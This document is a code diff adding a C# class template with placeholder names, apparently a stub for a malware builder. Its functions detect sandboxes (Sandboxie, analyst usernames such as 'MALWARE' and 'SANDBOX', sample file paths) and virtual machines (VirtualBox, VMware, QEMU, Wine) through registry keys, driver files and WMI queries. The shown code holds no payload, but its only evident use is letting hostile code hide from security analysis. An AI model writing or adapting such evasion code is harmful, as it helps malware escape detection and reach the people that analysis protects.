@@ -1,0 +1,108 @@
+	public class %ANTICLASS%{
+		[DllImport("kernel32.dll")]
+        public static extern IntPtr GetModuleHandle(string lpModuleName);
+        [DllImport("advapi32.dll", SetLastError = true)]
+        public static extern bool GetUserName(StringBuilder sb, ref Int32 length);
+        [DllImport("kernel32")]
+        static extern bool IsDebuggerPresent();
+        [DllImport("user32.dll", SetLastError = true)]
+        static extern IntPtr FindWindow(string lpClassName, IntPtr ZeroOnly);
+        [DllImport("kernel32.dll")]
+        extern public static IntPtr GetProcAddress(IntPtr hModule, string procedureName);
+        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        public static extern uint GetFileAttributes(string lpFileName);
+        public static string %__1%(string %__0%, string %__7%)
+        {
+            RegistryKey %__5%;
+            %__5% = Registry.LocalMachine.OpenSubKey(%__0%, false);
+            if (%__5% != null)
+            {
+                object %__6% = %__5%.GetValue(%__7%, (object)(string)"noValueButYesKey");
+                if (%__6%.GetType() == typeof(string))
+                {
+                    return %__6%.ToString();
+                }
+                if (%__5%.GetValueKind(%__7%) == RegistryValueKind.String || %__5%.GetValueKind(%__7%) == RegistryValueKind.ExpandString)
+                {
+                    return %__6%.ToString();
+                }
+                if (%__5%.GetValueKind(%__7%) == RegistryValueKind.DWord)
+                {
+                    return Convert.ToString((Int32)%__6%);
+                }
+                if (%__5%.GetValueKind(%__7%) == RegistryValueKind.QWord)
+                {
+                    return Convert.ToString((Int64)%__6%);
+                }
+                if (%__5%.GetValueKind(%__7%) == RegistryValueKind.Binary)
+                {
+                    return Convert.ToString((byte[])%__6%);
+                }
+                if (%__5%.GetValueKind(%__7%) == RegistryValueKind.MultiString)
+                {
+                    return string.Join("", (string[])%__6%);
+                }
+                return "noValueButYesKey";
+            }
+            return "noKey";
+        }
+        public static bool %sbox%(string %__2%)
+        {
+
+            StringBuilder %__3% = new StringBuilder();
+            Int32 %__4% = 50;
+            GetUserName(%__3%, ref %__4%);
+            if ((int)GetModuleHandle("SbieDll.dll") != 0) { return true; }
+            if (%__3%.ToString().ToUpper() == "USER") { return true; }
+            if (%__3%.ToString().ToUpper() == "SANDBOX") { return true; }
+            if (%__3%.ToString().ToUpper() == "VIRUS") { return true; }
+            if (%__3%.ToString().ToUpper() == "MALWARE") { return true; }
+            if (%__3%.ToString().ToUpper() == "SCHMIDTI") { return true; }
+            if (%__3%.ToString().ToUpper() == "CURRENTUSER") { return true; }
+            if (%__2%.ToUpper().Contains("\\VIRUS")) { return true; }
+            if (%__2%.ToUpper().Contains("SANDBOX")) { return true; }
+            if (%__2%.ToUpper().Contains("SAMPLE")) { return true; }
+            if (%__2% == "C:\file.exe") { return true; }
+            if ((int)FindWindow("Afx:400000:0", (IntPtr)0) != 0) { return true; }
+            return false;
+
+        }
+        public static bool %vm__%()
+        {
+
+            if (%__1%("HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0", "Identifier").ToUpper().Contains("VBOX")) { return true; }
+            if (%__1%("HARDWARE\\Description\\System", "SystemBiosVersion").ToUpper().Contains("VBOX")) { return true; }
+            if (%__1%("HARDWARE\\Description\\System", "VideoBiosVersion").ToUpper().Contains("VIRTUALBOX")) { return true; }
+            if (%__1%("SOFTWARE\\Oracle\\VirtualBox Guest Additions", "") == "noValueButYesKey") { return true; }
+            if (GetFileAttributes("C:\\WINDOWS\\system32\\drivers\\VBoxMouse.sys") != (uint)4294967295) { return true; }     
+            if (%__1%("HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0", "Identifier").ToUpper().Contains("VMWARE")) { return true; }
+            if (%__1%("SOFTWARE\\VMware, Inc.\\VMware Tools", "") == "noValueButYesKey") { return true; }
+            if (%__1%("HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 1\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0", "Identifier").ToUpper().Contains("VMWARE")) { return true; }
+            if (%__1%("HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 2\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0", "Identifier").ToUpper().Contains("VMWARE")) { return true; }
+            if (%__1%("SYSTEM\\ControlSet001\\Services\\Disk\\Enum", "0").ToUpper().Contains("vmware".ToUpper())) { return true; }
+            if (%__1%("SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000", "DriverDesc").ToUpper().Contains("VMWARE")) { return true; }
+            if (%__1%("SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\Settings", "Device Description").ToUpper().Contains("VMWARE")) { return true; }
+            if (%__1%("SOFTWARE\\VMware, Inc.\\VMware Tools", "InstallPath").ToUpper().Contains("C:\\PROGRAM FILES\\VMWARE\\VMWARE TOOLS\\")) { return true; }
+            if (GetFileAttributes("C:\\WINDOWS\\system32\\drivers\\vmmouse.sys") != (uint)4294967295) { return true; }
+            if (GetFileAttributes("C:\\WINDOWS\\system32\\drivers\\vmhgfs.sys") != (uint)4294967295) { return true; }
+            if (GetProcAddress((IntPtr)GetModuleHandle("kernel32.dll"), "wine_get_unix_file_name") != (IntPtr)0) { return true; }
+            if (%__1%("HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0", "Identifier").ToUpper().Contains("QEMU")) { return true; }
+            if (%__1%("HARDWARE\\Description\\System", "SystemBiosVersion").ToUpper().Contains("QEMU")) { return true; }
+            ManagementScope %__8% = new ManagementScope("\\\\.\\ROOT\\cimv2");
+            ObjectQuery %__9% = new ObjectQuery("SELECT * FROM Win32_VideoController");
+            ManagementObjectSearcher %__A% = new ManagementObjectSearcher(%__8%, %__9%);
+            ManagementObjectCollection %__B% = %__A%.Get();
+            foreach (ManagementObject %__C% in %__B%)
+            {
+               
+                if (%__C%["Description"].ToString() == "VM Additions S3 Trio32/64") { return true; }
+                if (%__C%["Description"].ToString() == "S3 Trio32/64") { return true; }
+                if (%__C%["Description"].ToString() == "VirtualBox Graphics Adapter") { return true; }
+                if (%__C%["Description"].ToString() == "VMware SVGA II") { return true; }
+                if (%__C%["Description"].ToString().ToUpper().Contains("VMWARE")) { return true; }
+                if (%__C%["Description"].ToString() == "") { return true; }
+            }
+
+            return false;
+        }
+		}
